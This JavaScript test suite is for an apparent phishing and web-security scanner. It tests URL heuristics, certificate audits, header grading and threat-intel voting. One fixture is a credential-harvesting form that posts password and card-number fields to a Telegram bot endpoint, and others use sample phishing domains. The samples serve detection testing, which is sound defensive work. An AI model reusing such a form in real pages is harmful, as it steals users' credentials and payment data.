/**
 * Automated Test Runner for TrustMatrix Security Platform
 */

const assert = require('node:assert');
const { analyzeThreat, analyzeUrlLexical, parseDomainParts } = require('../src/engines/threat_analyzer.js');
const { testROCA, auditPublicKey, auditCertificateAuthority } = require('../src/utils/crypto_audit.js');
const { parseCertificateDetails } = require('../src/engines/cert_validator.js');
const { auditWebSecurity, calculateGrade } = require('../src/engines/sec_auditor.js');
const { queryDomainIntel, exportSTIX21Bundle, getIntelStatistics } = require('../src/threat_intel/feed_manager.js');
const { submitThreatReport, castAnalystVote } = require('../src/threat_intel/community.js');
const { scanWebsite } = require('../src/engines/unified_scanner.js');
const { seedDatabase } = require('../src/database/seed.js');

let passedCount = 0;
let failedCount = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  [PASS] ${name}`);
    passedCount++;
  } catch (err) {
    console.error(`  [FAIL] ${name}`);
    console.error(`         ${err.message}`);
    failedCount++;
  }
}

async function runAsyncTest(name, fn) {
  try {
    await fn();
    console.log(`  [PASS] ${name}`);
    passedCount++;
  } catch (err) {
    console.error(`  [FAIL] ${name}`);
    console.error(`         ${err.message}`);
    failedCount++;
  }
}

async function runAllTests() {
  console.log('\n======================================================');
  console.log('   RUNNING TRUSTMATRIX AUTOMATED TEST SUITE           ');
  console.log('======================================================\n');

  seedDatabase();

  console.log('1. THREAT HEURISTICS & PHISHING ENGINE TESTS:');

  test('Should detect high-risk TLD in domain', () => {
    const res = analyzeUrlLexical('https://secure-login.xyz');
    const hasTldFlag = res.redFlags.some(f => f.rule === 'HIGH_RISK_TLD');
    assert.strictEqual(hasTldFlag, true, 'Expected HIGH_RISK_TLD flag');
  });

  test('Should detect typosquatting of Chase bank', () => {
    const res = analyzeUrlLexical('https://chasee.com/login');
    const hasTypo = res.redFlags.some(f => f.rule === 'TYPOSQUATTING_DETECTED');
    assert.strictEqual(hasTypo, true, 'Expected TYPOSQUATTING_DETECTED flag');
  });

  test('Should detect brand stuffing in subdomains', () => {
    const res = analyzeUrlLexical('https://paypal.com.verify-account.top/login');
    const hasBrandImpersonation = res.redFlags.some(f => f.rule === 'BRAND_IMPERSONATION');
    assert.strictEqual(hasBrandImpersonation, true, 'Expected BRAND_IMPERSONATION flag');
  });

  test('Should detect credential harvesting form and Telegram exfiltration', () => {
    const html = `
      <form action="https://api.telegram.org/bot1234/sendMessage" method="POST">
        <input type="password" name="pwd">
        <input type="text" name="card_number">
      </form>
    `;
    const res = analyzeThreat('https://untrusted-host.xyz', html, { title: 'Bank Login' });
    const hasExfil = res.redFlags.some(f => f.rule === 'FORM_ACTION_EXFILTRATION');
    assert.strictEqual(hasExfil, true, 'Expected FORM_ACTION_EXFILTRATION flag');
    assert.ok(res.compositeThreatScore >= 70, 'Threat score should be >= 70');
  });

  test('Should detect right-click anti-tampering script', () => {
    const html = `<body oncontextmenu="return false;"><h1>Login</h1></body>`;
    const res = analyzeThreat('https://test-site.com', html);
    const hasAntiAnalysis = res.redFlags.some(f => f.rule === 'ANTI_ANALYSIS_CONTEXT_MENU_DISABLED');
    assert.strictEqual(hasAntiAnalysis, true, 'Expected ANTI_ANALYSIS_CONTEXT_MENU_DISABLED flag');
  });

  console.log('\n2. CERTIFICATE, CRYPTO & eMUDHRA AUDITING TESTS:');

  test('Should flag RSA key with bit length < 2048', () => {
    const audit = auditPublicKey({ asymmetricKeyType: 'rsa', modulusLength: 1024, publicExponent: 65537 });
    const hasWeakKey = audit.issues.some(i => i.severity === 'HIGH' || i.severity === 'CRITICAL');
    assert.strictEqual(hasWeakKey, true, 'Expected weak key issue');
  });

  test('Should flag even public exponent in RSA key', () => {
    const audit = auditPublicKey({ asymmetricKeyType: 'rsa', modulusLength: 2048, publicExponent: 65536 });
    const hasEvenExp = audit.issues.some(i => i.title.includes('Even Public Exponent'));
    assert.strictEqual(hasEvenExp, true, 'Expected even exponent issue');
  });

  test('Should audit and flag eMudhra CA issuer', () => {
    const caAudit = auditCertificateAuthority('CN=eMudhra Sub-CA TLS Server Class 2, O=eMudhra Consumer Services Ltd, C=IN');
    assert.strictEqual(caAudit.eMudhraAnalysis.isEMudhraCA, true, 'Should detect eMudhra CA');
    assert.strictEqual(caAudit.eMudhraAnalysis.auditStatus, 'WARNING', 'Expected WARNING audit status');
  });

  test('Should flag newly issued certificate (< 48 hours old)', () => {
    const now = Date.now();
    const rawCert = {
      subject: { CN: 'temp-phish.xyz' },
      issuer: { CN: 'Let\'s Encrypt' },
      valid_from: new Date(now - 3600000 * 3).toUTCString(), // 3 hours old
      valid_to: new Date(now + 86400000 * 89).toUTCString(),
      bits: 2048,
      subjectaltname: 'DNS:temp-phish.xyz',
      sigalg: 'sha256WithRSAEncryption'
    };
    const details = parseCertificateDetails(rawCert, { hostname: 'temp-phish.xyz' });
    const hasNewCertFlag = details.certFlags.some(f => f.rule === 'NEWLY_ISSUED_CERTIFICATE');
    assert.strictEqual(hasNewCertFlag, true, 'Expected NEWLY_ISSUED_CERTIFICATE flag');
  });

  test('Should flag deprecated SHA-1 signature algorithm', () => {
    const now = Date.now();
    const rawCert = {
      subject: { CN: 'legacy.com' },
      issuer: { CN: 'Legacy CA' },
      valid_from: new Date(now - 86400000 * 100).toUTCString(),
      valid_to: new Date(now + 86400000 * 100).toUTCString(),
      bits: 2048,
      sigalg: 'sha1WithRSAEncryption'
    };
    const details = parseCertificateDetails(rawCert, { hostname: 'legacy.com' });
    const hasSha1Flag = details.certFlags.some(f => f.rule === 'DEPRECATED_SIGNATURE_ALGORITHM');
    assert.strictEqual(hasSha1Flag, true, 'Expected DEPRECATED_SIGNATURE_ALGORITHM flag');
  });

  console.log('\n3. WEB APPLICATION SECURITY POSTURE TESTS:');

  test('Should award grade A+ to site with all security headers', () => {
    const headers = {
      'content-security-policy': "default-src 'self'",
      'strict-transport-security': 'max-age=31536000; includeSubDomains; preload',
      'x-frame-options': 'DENY',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'strict-origin-when-cross-origin',
      'permissions-policy': 'camera=(), microphone=()',
      'cross-origin-opener-policy': 'same-origin',
      'cross-origin-resource-policy': 'same-origin'
    };
    const sec = auditWebSecurity(headers, '', 'https://bank.com');
    assert.ok(sec.securityScore >= 90, 'Score should be >= 90');
    assert.strictEqual(sec.grade, 'A+', 'Grade should be A+');
  });

  test('Should award grade F to site missing all security headers', () => {
    const sec = auditWebSecurity({}, '', 'http://insecure-site.com');
    assert.strictEqual(sec.grade, 'F', 'Grade should be F');
    assert.strictEqual(sec.securityScore, 0, 'Score should be 0');
  });

  test('Should flag insecure CORS wildcard with credentials', () => {
    const headers = {
      'access-control-allow-origin': '*',
      'access-control-allow-credentials': 'true'
    };
    const sec = auditWebSecurity(headers, '', 'https://api.site.com');
    const hasCorsIssue = sec.issues.some(i => i.title.includes('Insecure CORS'));
    assert.strictEqual(hasCorsIssue, true, 'Expected CORS wildcard credentials issue');
  });

  console.log('\n4. COLLABORATIVE THREAT INTEL & COMMUNITY CONSENSUS TESTS:');

  test('Should match known seeded malicious IOC', () => {
    const intel = queryDomainIntel('chase-secure-login-portal.xyz');
    assert.strictEqual(intel.isKnownMalicious, true, 'Domain should be marked malicious');
    assert.strictEqual(intel.targetBrand, 'JPMorgan Chase');
  });

  test('Should submit community report and allow analyst voting', () => {
    const reportRes = submitThreatReport({
      url: 'https://new-suspicious-crypto-drainer.xyz',
      category: 'Crypto Drainer Scam',
      target_brand: 'MetaMask',
      reporter_name: 'Alex SecAnalyst',
      reporter_role: 'SOC Analyst',
      evidence: 'Injects malicious ERC-20 permit approvals',
      notes: 'Seen circulating on Telegram crypto groups'
    });

    assert.strictEqual(reportRes.success, true, 'Report submission should succeed');
    assert.ok(reportRes.reportId, 'Report ID should be returned');

    // Analyst 1 upvotes
    const vote1 = castAnalystVote(reportRes.reportId, 'analyst_1', 'UPVOTE', 'Confirmed malicious permit payload');
    assert.strictEqual(vote1.success, true);
    assert.strictEqual(vote1.upvotes, 2);

    // Analyst 2 upvotes -> Reaches threshold 3 upvotes, auto-promotes to VERIFIED!
    const vote2 = castAnalystVote(reportRes.reportId, 'analyst_2', 'UPVOTE', 'Matches signature of AngelDrainer');
    assert.strictEqual(vote2.newStatus, 'VERIFIED', 'Status should auto-promote to VERIFIED');
  });

  test('Should export standardized STIX 2.1 bundle', () => {
    const bundle = exportSTIX21Bundle();
    assert.strictEqual(bundle.type, 'bundle');
    assert.strictEqual(bundle.spec_version, '2.1');
    assert.ok(bundle.objects.length >= 5, 'Bundle should contain multiple threat indicators');
  });

  console.log('\n5. UNIFIED SCANNER END-TO-END TESTS:');

  await runAsyncTest('Should scan phishing scenario and output CRITICAL_MALICIOUS composite score', async () => {
    const result = await scanWebsite('https://chase-secure-login-portal.xyz/verify');
    assert.strictEqual(result.composite.severity, 'CRITICAL_MALICIOUS');
    assert.ok(result.composite.compositeScore >= 90);
    assert.ok(result.threatAnalysis.redFlags.length >= 4);
  });

  await runAsyncTest('Should scan eMudhra CA scenario and identify PKI vulnerabilities', async () => {
    const result = await scanWebsite('https://suspicious-emudhra-issued-portal.com');
    assert.ok(result.certAnalysis.certRiskScore >= 80);
    assert.strictEqual(result.certAnalysis.keyAudit.asymmetricKeyType, 'rsa');
  });

  await runAsyncTest('Should scan legitimate bank and output SAFE composite score', async () => {
    const result = await scanWebsite('https://www.chase.com');
    assert.strictEqual(result.composite.severity, 'SAFE');
    assert.ok(result.composite.compositeScore <= 15);
  });

  console.log('\n======================================================');
  console.log(` TEST SUMMARY: ${passedCount} PASSED, ${failedCount} FAILED `);
  console.log('======================================================\n');

  if (failedCount > 0) {
    process.exit(1);
  }
}

runAllTests().catch(err => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
